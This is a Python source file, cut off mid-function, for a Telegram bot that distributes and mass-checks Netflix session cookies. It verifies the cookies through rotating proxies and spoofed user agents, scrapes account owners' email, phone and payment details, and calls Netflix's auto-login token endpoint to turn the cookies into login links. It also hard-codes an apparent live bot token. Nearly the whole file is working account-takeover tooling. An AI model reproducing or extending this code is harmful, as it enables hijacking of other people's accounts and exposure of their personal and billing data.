#!/usr/bin/env python3
# ============================================================
# NF BOT – FRESH UI (PRODUCTION READY) – FINAL MERGED
# Core logic from nfex.py unchanged. Added:
# - Thread-safe file locking
# - Username tracking
# - Admin commands: /broadcast, /bdfb, /listfb, /clearfb, /autoban
# - Auto-broadcast and auto-ban for pending feedback
# - Non-blocking /get (all I/O offloaded)
# Made by @darkhuchannel
# ============================================================

import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import shutil
from collections import OrderedDict, defaultdict
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Tuple, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)
from telegram.request import HTTPXRequest
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
from keep_alive import live
import aiohttp
import aiofiles
import emoji

async def log_memory():
    import tracemalloc
    tracemalloc.start()
    while True:
        await asyncio.sleep(300)
        current, peak = tracemalloc.get_traced_memory()
        log.info(f"Memory: current={current/1024/1024:.2f} MB, peak={peak/1024/1024:.2f} MB")
        
# ========== CONFIGURATION (ENV REQUIRED) ==========
TOKEN = os.getenv("BOT_TOKEN", "8656224854:AAHmT_-IR5hIlaijF29_xH8-82feHUKypok")
if not TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

ADMIN_IDS = [int(id_) for id_ in os.getenv("ADMIN_IDS", "7246097389,6725209689,6426038286").split(",") if id_.strip()]
if not ADMIN_IDS:
    ADMIN_IDS = [7246097389]

WATERMARK = "⚡ Made by @darkhuchannel"

MAX_WORKERS = 10
BATCH_SIZE = 5
BATCH_DELAY = 0.5
dot_length = 10
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 30
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/125.0",
]

PROXY_CHECK_INTERVAL = 30

FREE_BASIC_LIMIT = 1
FREE_STANDARD_LIMIT = 1
FREE_PREMIUM_LIMIT = 1
FREE_CHECK_LIMIT = 50
MAX_COOKIES_PER_MASS_CHECK = 400
MASS_CHECK_DAILY_COOKIE_LIMIT = 2000
PREMIUM_LIMIT = 9999

REFERRAL_REWARD_HOURS = 24
REFERRAL_REWARD_CHECK_QUOTA = 100
REFERRAL_REWARD_GET_QUOTA = 1

USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
USED_FILE = "used_cookies.json"
BASIC_FILE = "basic.txt"
STANDARD_FILE = "standard.txt"
PREMIUM_FILE = "premium.txt"
SPLIT_TEMP_DIR = "split_temp"

REQUIRED_CHANNELS = ["@Netflixbydark", "@darkhuchannel_chat", "@darkhuchannel", "@public_cards", "@QRscanWorks"]
CHANNEL_LINKS = {
    "@darkhuchannel": "https://t.me/darkhuchannel",
    "@Netflixbydark": "https://t.me/Netflixbydark",
    "@darkhuchannel_chat": "https://t.me/darkhuchannel_chat",
    "@public_cards": "https://t.me/public_cards",
    "@QRscanWorks": "https://t.me/QRscanWorks"
}

FEEDBACK_CHANNEL = -1004430970211
FEEDBACK_TIMEOUT_MINUTES = 5   # in minutes
cookie_claim_lock = asyncio.Lock()

POOL_CACHE_TTL = 60

# ---- NEW: Auto-ban config ----
AUTOBAN_ENABLED = False
AUTOBAN_TIMEOUT_MINUTES = 10

# ---- NEW: Broadcast config ----
feedback_broadcast_interval = 0  # minutes, 0 = disabled

# ============================================================
# Clean up split temp
if os.path.exists(SPLIT_TEMP_DIR):
    shutil.rmtree(SPLIT_TEMP_DIR)
os.makedirs(SPLIT_TEMP_DIR, exist_ok=True)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
log = logging.getLogger(__name__)

# ---------- PREMIUM EMOJIS ----------
SPECIAL_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🦓": "5406756500108501710", "🔰": "6266995104687330978", "🔍": "5258396243666681152",
    "🤖": "5447510826304959724", "🔑": "5454386656628991407", "⏱️": "5343927661213279013",
    "💥": "5122933683820430249", "🦔": "5447311106030726740", "👤": "5445174334031166029",
    "📅": "5116575178012235794", "🔄": "5454245266305604993", "🦋": "5445408306669582934",
    "🥰": "5444931419270839381", "😱": "5447181973544008180", "🔷": "5258024802010026053",
    "🔶": "5454386656628991407", "📆": "5454074580010295588", "👕": "5454371323595744068",
    "🥕": "5447653032672129347", "➡️": "5445350109862720603", "🦉": "5123344136665039833",
    "🍑": "5445408306669582934", "💪": "5305622454218024328", "🌝": "5341684837881235158",
    "📁": "5444908424015934570", "ℹ️": "5289930378885214069", "💀": "5231338559587257737",
    "📢": "5116445341150872576", "💰": "5116648080787112958", "🔘": "5219901967916084166",
    "🔗": "5447479640547428304", "👇": "5122933683820430249", "📌": "5447187153274567373",
    "🍳": "5305622454218024328", "💸": "5283232570660634549", "🎉": "5172632227871196306",
    "🎁": "5283031441637148958", "🚫": "5116151848855667552", "🛒": "5447319442562251569",
    "🔧": "4904936030232117798", "⛔️": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡️": "5219672809936006424", "📨": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📺": "5445158077579952110", "📡": "5447448489149625830",
    "🌘": "5310224206732996002", "📓": "5447187153274567373", "🔟": "5258476306152038031",
    "😇": "6321225560789877992", "👌": "5445350109862720603", "⭐": "6267298050205553492",
    "🍭": "6267152480878990865", "⚙️": "5258023599419171861", "⛔": "4918014360267260850",
    "📥": "5350747347724810871", "💵": "5350711759625795085", "️🏷️": "5436285465420383204",
    "📂": "5444908424015934570", "🛠️": "5348239232852836489", "📄️": "5323538339062628165",
    "🔒": "5447453226498552490", "👑": "5447479640547428304", "❕": "5289930378885214069",
    "👻": "5447181973544008180",
}
ALL_PREMIUM_IDS = list(SPECIAL_EMOJI_IDS.values())

def premium_emoji(text: str) -> str:
    if not text:
        return text
    code_blocks = []
    def repl(match):
        code_blocks.append(match.group(0))
        return f"__CODE_{len(code_blocks)-1}__"
    text = re.sub(r'<code>.*?</code>', repl, text, flags=re.DOTALL)
    text = html_mod.escape(text)
    new_text = ""
    for char in text:
        if emoji.is_emoji(char):
            emoji_id = SPECIAL_EMOJI_IDS.get(char, random.choice(ALL_PREMIUM_IDS))
            new_text += f'<tg-emoji emoji-id="{emoji_id}">{char}</tg-emoji>'
        else:
            new_text += char
    for i, block in enumerate(code_blocks):
        new_text = new_text.replace(f"__CODE_{i}__", block)
    return new_text

# ---------- PROXY MANAGER ----------
class ProxyManager:
    def __init__(self):
        self.proxies = set()
        self._dirty = False
        self._flush_task = None

    def load_from_file(self, filename="proxy.txt"):
        if not os.path.exists(filename):
            return []
        try:
            with open(filename, "r") as f:
                lines = [line.strip() for line in f if line.strip()]
            self.proxies = set(lines)
            return lines
        except IOError:
            return []

    async def save_to_file_async(self, filename="proxy.txt"):
        async with aiofiles.open(filename, "w") as f:
            await f.write("\n".join(self.proxies))

    def add_proxies(self, new_proxies):
        added = [p for p in new_proxies if p not in self.proxies]
        if added:
            self.proxies.update(added)
            self._dirty = True
            if self._flush_task is None or self._flush_task.done():
                loop = asyncio.get_event_loop()
                self._flush_task = loop.create_task(self._flush_after_delay())
        return added

    async def _flush_after_delay(self):
        await asyncio.sleep(5)
        if self._dirty:
            await self.save_to_file_async("proxy.txt")
            self._dirty = False

    async def flush_now(self):
        if self._dirty:
            await self.save_to_file_async("proxy.txt")
            self._dirty = False
        if self._flush_task and not self._flush_task.done():
            self._flush_task.cancel()

# ---------- PROXY CHECKER ----------
class ProxyChecker:
    def __init__(self, timeout=5):
        self.timeout = timeout
        self.live = []
        self.bad = 0
        self.errors = 0

    async def check_all(self, proxies, target=0, threads=100, progress_callback=None, stop_flag=None):
        self.live = []
        self.bad = 0
        self.errors = 0
        total = len(proxies)
        checked = [0]
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout+2)
        ) as session:
            sem = asyncio.Semaphore(threads)
            tasks = []
            def make_progress_callback():
                checked[0] += 1
                if progress_callback:
                    progress_callback(total, checked[0])
            for proxy in proxies:
                if stop_flag and stop_flag():
                    break
                tasks.append(
                    self._check_one(sem, proxy, session, make_progress_callback)
                )
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        self.live.sort(key=lambda x: x[1])
        if target > 0 and len(self.live) > target:
            self.live = self.live[:target]
        return self.live

    async def _check_one(self, sem, proxy_str, session, cb):
        async with sem:
            start = time.time()
            try:
                parts = proxy_str.split(':')
                if len(parts) < 2:
                    raise ValueError("Invalid format")
                ip = parts[0]
                port = parts[1]
                proxy_url = f"http://{ip}:{port}"
                if len(parts) == 4:
                    user, pwd = parts[2], parts[3]
                    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
                test_urls = ["https://httpbin.org/ip", "https://api.ipify.org?format=json"]
                for test_url in test_urls:
                    try:
                        async with session.get(test_url, proxy=proxy_url, timeout=self.timeout) as resp:
                            if resp.status == 200:
                                latency = time.time() - start
                                self.live.append((proxy_str, latency))
                                if cb:
                                    cb()
                                return
                    except:
                        continue
                self.bad += 1
                if cb:
                    cb()
            except:
                self.bad += 1
                if cb:
                    cb()

# ---------- GLOBALS ----------
cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()
user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_tasks = {}
pool_file_lock = asyncio.Lock()

# ---- NEW: File locks for user data ----
users_file_lock = threading.Lock()
used_file_lock = threading.Lock()
keys_file_lock = threading.Lock()

async def cleanup_user(user_id: str):
    async with user_locks[user_id]:
        if user_id in user_state and not user_state[user_id].get('busy', False):
            del user_state[user_id]
        if user_id in user_tasks and user_tasks[user_id].done():
            del user_tasks[user_id]

global_stats = {
    "total_mass_checks": 0,
    "total_single_checks": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

tv_stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check")]
])

GLOBAL_EXECUTOR = ThreadPoolExecutor(max_workers=MAX_WORKERS * 2)

# Token cache
TOKEN_CACHE = {}
TOKEN_CACHE_TTL = 3600
TOKEN_CACHE_LOCK = asyncio.Lock()
TOKEN_CACHE_LAST_CLEANUP = 0
TOKEN_CACHE_MAX_SIZE = 2000

async def cleanup_token_cache():
    global TOKEN_CACHE_LAST_CLEANUP
    now = time.time()
    if now - TOKEN_CACHE_LAST_CLEANUP < 300:
        return
    async with TOKEN_CACHE_LOCK:
        expired = [k for k, (_, exp) in TOKEN_CACHE.items() if exp < now]
        for k in expired:
            del TOKEN_CACHE[k]
        if len(TOKEN_CACHE) > TOKEN_CACHE_MAX_SIZE:
            sorted_items = sorted(TOKEN_CACHE.items(), key=lambda x: x[1][1])
            for k, _ in sorted_items[:len(TOKEN_CACHE) - TOKEN_CACHE_MAX_SIZE]:
                del TOKEN_CACHE[k]
        TOKEN_CACHE_LAST_CLEANUP = now

# ---------- PROXY MANAGER INSTANCE ----------
proxy_manager = ProxyManager()
proxy_manager.load_from_file(PROXY_FILE)

# ---------- POOL CACHE ----------
_pool_cache = {
    "basic": [],
    "standard": [],
    "premium": [],
    "last_refresh": 0
}

async def get_pool_cached(force=False):
    now = time.time()
    if force or (now - _pool_cache["last_refresh"] > POOL_CACHE_TTL):
        async with pool_file_lock:
            basic = await read_plan_file_async(BASIC_FILE)
            standard = await read_plan_file_async(STANDARD_FILE)
            premium = await read_plan_file_async(PREMIUM_FILE)
            _pool_cache["basic"] = basic
            _pool_cache["standard"] = standard
            _pool_cache["premium"] = premium
            _pool_cache["last_refresh"] = now
    return _pool_cache["basic"], _pool_cache["standard"], _pool_cache["premium"]

async def read_plan_file_async(path: str) -> List[str]:
    if not os.path.exists(path):
        return []
    async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    tokens = []
    seen = set()
    for line in lines:
        nid = generator.extract_netflixid(line)
        if nid and nid not in seen:
            tokens.append(nid)
            seen.add(nid)
    return tokens

def read_plan_file(path: str) -> List[str]:
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    tokens = []
    seen = set()
    for line in lines:
        nid = generator.extract_netflixid(line)
        if nid and nid not in seen:
            tokens.append(nid)
            seen.add(nid)
    return tokens

async def write_plan_file_async(path: str, nids: List[str]):
    async with aiofiles.open(path, 'w', encoding='utf-8') as f:
        await f.write("\n".join(nids))

async def get_pool_counts(force=False) -> Dict:
    basic, standard, premium = await get_pool_cached(force=force)
    return {"basic": len(basic), "standard": len(standard), "premium": len(premium)}

# ---------- HELPER: get_random_user_agent ----------
def get_random_user_agent():
    return random.choice(USER_AGENTS)

# ---------- PROXY LOADER ----------
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    m = re.match(r'^(https?|socks5h?)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$', line, re.IGNORECASE)
    if m:
        s, u, p, h, port = m.groups()
        url = f"{s}://{u}:{p}@{h}:{port}" if u else f"{s}://{h}:{port}"
        return {"http": url, "https": url}
    m = re.match(r'^([^:]+):(\d+)$', line)
    if m:
        return {"http": f"http://{m.group(1)}:{m.group(2)}", "https": f"http://{m.group(1)}:{m.group(2)}"}
    return None

def load_proxies():
    proxies = []
    for p in proxy_manager.proxies:
        parsed = parse_proxy_line(p)
        if parsed:
            proxies.append(parsed)
    return proxies

# ---------- NETFLIX TOKEN GENERATOR ----------
class NetflixTokenGenerator:
    def __init__(self):
        self.session_headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
        }

    def extract_netflixid(self, raw_cookie: str) -> Optional[str]:
        if not raw_cookie:
            return None
        try:
            decoded = urllib.parse.unquote(raw_cookie)
            if 'NetflixId=' in decoded:
                after_nf = decoded.split('NetflixId=')[1].split(';')[0].strip()
                if after_nf.startswith('ct='):
                    return after_nf
                return after_nf
            if decoded.startswith('ct='):
                return decoded
            ct_match = re.search(r'ct=([^&]+)', decoded)
            if ct_match:
                return 'ct=' + ct_match.group(1)
            if len(decoded.strip()) > 20:
                return decoded.strip()
            return None
        except:
            return None

    def _extract_initial_state(self, html: str) -> Optional[Dict]:
        pattern = r'<script[^>]*>window\.__INITIAL_STATE__\s*=\s*({.*?});\s*</script>'
        match = re.search(pattern, html, re.DOTALL)
        if not match:
            return None
        try:
            return json.loads(match.group(1))
        except:
            return None

    # ---- IMPROVED extract_account_info (state-based, no keyword fallback) ----
    def extract_account_info(self, html_content: str) -> Dict:
        info = {
            'email': 'N/A',
            'plan_nombre': 'N/A',
            'pais': 'N/A',
            'renovacion_fecha': 'N/A',
            'streams': 'Unknown',
            'quality': 'Unknown',
            'payment_method': 'Unknown',
            'phone': 'Not linked',
            'hold': 'No',
            'price': 'N/A',
            'member_since': 'Unknown',
            'phone_verified': 'Unknown',
            'email_verified': 'Unknown',
            'extra_member': 'Unknown',
            'profiles': 'Unknown',
            'user_guid': 'Unknown',
            'active': True,
        }

        def find(pattern):
            m = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            return m.group(1).strip() if m else None

        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        if email:
            info['email'] = email

        plan_raw = (
            find(r'"localizedPlanName".*?"value":"([^"]+)"') or
            find(r'"planName"\s*:\s*"([^"]+)"') or
            find(r'"plan"\s*:\s*"([^"]+)"') or
            find(r'"membershipStatus".*?"planName"\s*:\s*"([^"]+)"')
        )
        if plan_raw:
            info['plan_nombre'] = plan_raw

        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or
            find(r'"currentCountry"\s*:\s*"([^"]+)"') or
            find(r'"countryCode"\s*:\s*"([^"]+)"')
        )
        if country:
            info['pais'] = country

        billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"') or
            find(r'"nextBilling"[^}]*"value":"([^"]+)"') or
            find(r'"nextBillingDate"\s*:\s*"([^"]+)"') or
            find(r'"renewalDate"\s*:\s*"([^"]+)"')
        )
        if billing:
            info['renovacion_fecha'] = billing

        streams = find(r'"maxStreams":\{[^}]*"value":([0-9]+)') or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        if streams:
            info['streams'] = streams

        quality = find(r'"videoQuality":\{[^}]*"value":"([^"]+)"') or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        if quality:
            info['quality'] = quality

        payment = find(r'"paymentMethod":\{[^}]*"value":"([^"]+)"') or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        if payment:
            info['payment_method'] = payment.replace('_', ' ').title()

        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"') or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        if phone:
            info['phone'] = phone

        price = find(r'"planPrice":\{[^}]*"value":"([^"]+)"') or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        if price:
            info['price'] = price

        member_since = find(r'"memberSince"\s*:\s*"([^"]+)"')
        if member_since:
            info['member_since'] = member_since

        pv = re.search(r'"phoneVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
        if pv:
            info['phone_verified'] = 'Yes' if pv.group(1).lower() == 'true' else 'No'

        ev = re.search(r'"emailVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
        if ev:
            info['email_verified'] = 'Yes' if ev.group(1).lower() == 'true' else 'No'

        extra = re.search(r'"showExtraMemberSection":\{[^}]*"value":(true|false)', html_content, re.IGNORECASE)
        if extra:
            info['extra_member'] = 'Yes' if extra.group(1).lower() == 'true' else 'No'

        guid = find(r'"userGuid"\s*:\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
        if guid:
            info['user_guid'] = guid

        status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_content, re.IGNORECASE)
        if status_match and status_match.group(1).upper() == 'INACTIVE':
            info['active'] = False
            info['hold'] = 'Yes'
            info['membership_status'] = 'INACTIVE'

        # ---- FIX: multi-language restart detection ----
        restart_patterns = [
            r'restart your membership',
            r'mulai lagi',
            r'aktifkan kembali',
            r'reanudar (?:tu|la) suscripción',
            r'reinicie su suscripción',
            r'redémarrer (?:votre|ton) abonnement',
            r'renouveler (?:votre|ton) abonnement',
            r'wieder aktivieren',
            r'mitgliedschaft (?:wieder|neu) starten',
            r'riavvia (?:il tuo|l\'abbonamento)',
            r'reinizia (?:il tuo|l\'abbonamento)',
            r'reiniciar (?:sua|a) assinatura',
            r'reativar (?:sua|a) assinatura',
            r'opnieuw starten (?:je|uw) abonnement',
            r'hervat (?:je|uw) abonnement',
            r'wznów (?:swoją|członkostwo)',
            r'przywróć (?:swoją|członkostwo)',
            r'yeniden başlat (?:üyeliğini|hesabını)',
            r'tekrar (?:başlat|etkinleştir)',
            r'возобновить (?:подписку|членство)',
            r'перезапустить (?:подписку|членство)',
            r'إعادة تشغيل العضوية',
            r'استئناف العضوية',
            r'सदस्यता पुनः आरंभ करें',
            r'पुनः सक्रिय करें',
            r'重新启动会员资格',
            r'续订会员资格',
            r'メンバーシップを再開',
            r'再開する',
            r'멤버십 다시 시작',
            r'재시작',
            r'starta om medlemskapet',
            r'återaktivera',
            r'start medlemskapet på nytt',
            r'gjenoppta',
            r'genstart medlemskab',
            r'forny',
            r'aloita jäsenyys uudelleen',
            r'jatka',
            r'επανεκκίνηση συνδρομής',
            r'ενεργοποίηση ξανά',
            r'เริ่มต้นใหม่',
            r'เปิดใช้งานอีกครั้ง',
            r'khởi động lại tư cách thành viên',
            r'gia hạn',
            r'reia abonamentul',
            r'reactivează',
            r'obnovit členství',
            r'restartovat',
            r'újraindítás',
            r'újrakezdés',
            r'перезапустити підписку',
            r'відновити',
            r'your account is on hold',
            r'renew your membership',
            r'reactivate your subscription',
            r'reactivate your membership',
            r'reactiver votre abonnement',
            r'réactiver',
            r'terminer votre inscription',
            r'complete your registration',
            r'finish signing up',
            r'selesaikan pendaftaran',
            r'pendaftaran',
            r'khusus anggota baru',
            r'join now',
            r'start your free trial',
            r'(?:subscription|account|membership) (?:has )?expired',
            r'no active subscription',
            r'not currently active',
            r'this account is not active',
            r'(?:subscription|account) (?:is )?(?:paused|suspended)',
            r'abonnement expiré',
            r'compte suspendu',
            r'suscripción expirada',
            r'cuenta suspendida',
            r'assinatura expirada',
            r'assinatura suspensa',
            r'abonnement abgelaufen',
            r'mitgliedschaft abgelaufen',
            r'abbonamento scaduto',
            r'abbonamento sospeso',
            r'срок действия ист(?:ё|е)к',
            r'подписка приостановлена',
            r'aboneliğin süresi doldu',
            r'berlangganan berakhir',
            r'akun ditangguhkan',
            r'انتهت العضوية',
            r'عضوية معلقة',
        ]
        if any(re.search(p, html_content, re.IGNORECASE) for p in restart_patterns):
            info['active'] = False
            info['hold'] = 'Yes'
            info['membership_status'] = 'INACTIVE'

        hold = None
        hold_match = re.search(r'"isOnHold"\s*:\s*(true|false)', html_content, re.IGNORECASE)
        if hold_match:
            hold = hold_match.group(1).lower()
        else:
            hold_match = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html_content, re.IGNORECASE)
            if hold_match:
                hold = hold_match.group(1).lower()
        if hold is None and re.search(r'your account is on hold', html_content, re.IGNORECASE):
            hold = 'true'

        if hold is not None:
            info['hold'] = 'Yes' if hold == 'true' else 'No'

        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html_content)
        if not profiles:
            profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', html_content)
        if not profiles:
            state = self._extract_initial_state(html_content)
            if state:
                profs = state.get('profiles') or state.get('account', {}).get('profiles')
                if isinstance(profs, list):
                    names = [p.get('name') or p.get('profileName') or p.get('displayName') for p in profs if isinstance(p, dict)]
                    if names:
                        profiles = names
        if profiles:
            info['profiles'] = ', '.join(profiles[:5])

        plan_lower = info['plan_nombre'].lower()
        if info['quality'] == 'Unknown':
            if any(x in plan_lower for x in ['premium', 'ultra', '4k', '4 screen']):
                info['quality'] = 'UHD (4K)'
            elif any(x in plan_lower for x in ['standard', 'estándar', 'full hd', 'fhd', '2 screen']):
                info['quality'] = 'FHD (1080p)'
            elif any(x in plan_lower for x in ['basic', 'básico', 'basique', 'essential', 'mobile', '1 screen']):
                info['quality'] = 'HD (720p)'
        if info['streams'] == 'Unknown':
            if any(x in plan_lower for x in ['premium', 'ultra', '4 screen']):
                info['streams'] = '4'
            elif any(x in plan_lower for x in ['standard', '2 screen']):
                info['streams'] = '2'
            elif any(x in plan_lower for x in ['basic', '1 screen']):
                info['streams'] = '1'

        return info

    def get_cookies_and_info(self, netflix_id: str, retries: int = 4, proxy: Optional[dict] = None) -> Tuple[Optional[Dict[str, str]], Dict]:
        for attempt in range(retries):
            try:
                with requests.Session() as session:
                    session.headers.update(self.session_headers)
                    session.headers['User-Agent'] = get_random_user_agent()
                    if proxy:
                        session.proxies.update(proxy)
                    session.cookies.set('NetflixId', netflix_id, domain='.netflix.com')
                    urls = [
                        "https://www.netflix.com/YourAccount",
                        "https://www.netflix.com/account",
                        "https://www.netflix.com/account/membership",
                    ]
                    response = None
                    for url in urls:
                        try:
                            resp = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True, verify=False)
                            if resp.status_code == 200 and ('Account' in resp.text or 'membershipStatus' in resp.text):
                                response = resp
                                break
                        except:
                            continue
                    if not response:
                        if attempt < retries - 1:
                            time.sleep(2 * (attempt + 1))
                            continue
                        return None, {'reason': 'No response from Netflix after retries'}
                    if 'login' in response.url.lower() or 'signin' in response.url.lower():
                        return None, {'reason': 'Redirected to login (cookie expired or invalid)'}
                    account_info = self.extract_account_info(response.text)
                    cookies = {c.name: c.value for c in session.cookies}
                    return cookies, account_info
            except requests.exceptions.Timeout:
                if attempt < retries - 1:
                    time.sleep(2 * (attempt + 1))
                    continue
                return None, {'reason': f'Request timeout after {retries} attempts'}
            except Exception as e:
                if attempt < retries - 1:
                    time.sleep(2 * (attempt + 1))
                    continue
                return None, {'reason': f'Exception: {str(e)[:100]}'}
        return None, {'reason': 'Unknown error'}

    def generate_nftoken(self, cookies: Dict[str, str], retries: int = 3) -> Optional[str]:
        required = ['NetflixId', 'SecureNetflixId', 'nfvdid']
        if not all(k in cookies for k in required):
            return None
        session = requests.Session()
        session.headers.update(self.session_headers)
        for attempt in range(retries):
            try:
                cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
                headers = {
                    'User-Agent': get_random_user_agent(),
                    'Content-Type': 'application/json',
                    'Cookie': cookie_str,
                }
                payload = {
                    "operationName": "CreateAutoLoginToken",
                    "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
                    "extensions": {
                        "persistedQuery": {
                            "version": 102,
                            "id": "76e97129-f4b5-41a0-a73c-12e674896849"
                        }
                    }
                }
                response = session.post(
                    'https://android13.prod.ftl.netflix.com/graphql',
                    headers=headers,
                    json=payload,
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200:
                    data = response.json()
                    token = data.get('data', {}).get('createAutoLoginToken')
                    if token:
                        return token
                elif response.status_code == 429:
                    if attempt < retries - 1:
                        time.sleep(3 * (attempt + 1))
                        continue
            except:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
        return None

    def verify_cookie(self, netflix_id: str, proxy: Optional[dict] = None) -> Tuple[bool, Dict]:
        cookies, info = self.get_cookies_and_info(netflix_id, proxy=proxy)
        if not cookies:
            return False, info
        if info.get('membership_status') == 'INACTIVE':
            return False, {'reason': 'Account inactive', 'membership_status': 'INACTIVE'}
        # If we can't find any account data (email, plan, country), it's inactive
        if info.get('email') == 'N/A' and info.get('plan_nombre') == 'N/A' and info.get('pais') == 'N/A':
            return False, {'reason': 'Account inactive (no data found)', 'membership_status': 'INACTIVE'}
        token = self.generate_nftoken(cookies)
        if token:
            info['_token'] = token
            return True, info
        # Fallback: iOS token
        ios_token, err = generate_nftoken_ios(cookies)
        if ios_token:
            info['_token'] = ios_token['token']
            return True, info
        # Even if token fails, the cookie is valid (account info retrieved)
        return True, info

generator = NetflixTokenGenerator()

# ---------- HELPERS ----------
def load_json(file, default):
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            log.warning(f"Corrupt JSON file {file}, using default")
            return default
    return default

def save_json(file, data):
    tmp = file + ".tmp"
    try:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        os.replace(tmp, file)
    except Exception as e:
        log.error(f"Failed to save {file}: {e}")
        # Optionally raise, but we log and continue

# ---- NEW: Locked load/save functions ----
def load_users():
    with users_file_lock:
        return load_json(USERS_FILE, {})

def save_users(users):
    with users_file_lock:
        save_json(USERS_FILE, users)

def load_keys():
    with keys_file_lock:
        return load_json(KEYS_FILE, {})

def save_keys(keys):
    with keys_file_lock:
        save_json(KEYS_FILE, keys)

def load_used():
    with used_file_lock:
        return set(load_json(USED_FILE, []))

def save_used(used):
    with used_file_lock:
        save_json(USED_FILE, list(used))

# ---- NEW: ensure_user with username storage ----
def ensure_user(user_id: str, username: str = None) -> Tuple[Dict, Dict]:
    users = load_users()
    today = datetime.now().strftime("%Y-%m-%d")
    if user_id not in users:
        users[user_id] = {
            "last_claim_date": today,
            "last_check_date": today,
            "premium_expiry": 0,
            "premium_check_quota": 0,
            "premium_get_quota": 0,
            "is_admin": user_id in [str(a) for a in ADMIN_IDS] or int(user_id) in ADMIN_IDS,
            "pending_premium": 0,
            "referral_count": 0,
            "claimed_total": 0,
            "claimed_basic_today": 0,
            "claimed_standard_today": 0,
            "claimed_premium_today": 0,
            "checks_today": 0,
            "mass_checked_cookies_today": 0,
            "joined_channels": False,
            "referred_by": None,
            "banned": False,
            "ban_reason": "",
            "username": username or "",
        }
    else:
        user = users[user_id]
